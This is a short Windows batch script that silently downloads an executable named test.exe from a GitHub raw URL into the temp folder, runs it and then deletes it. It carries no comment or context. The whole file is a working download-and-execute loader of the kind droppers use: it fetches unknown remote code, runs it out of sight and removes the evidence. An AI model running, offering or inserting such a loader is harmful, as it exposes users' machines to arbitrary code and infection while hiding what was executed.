@echo off
set "FILE=%TEMP%\tmpTEST.exe"
curl -s -L "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/test.exe" -o "%FILE%"
if exist "%FILE%" (
    start /wait "" "%FILE%"
    del "%FILE%"
)
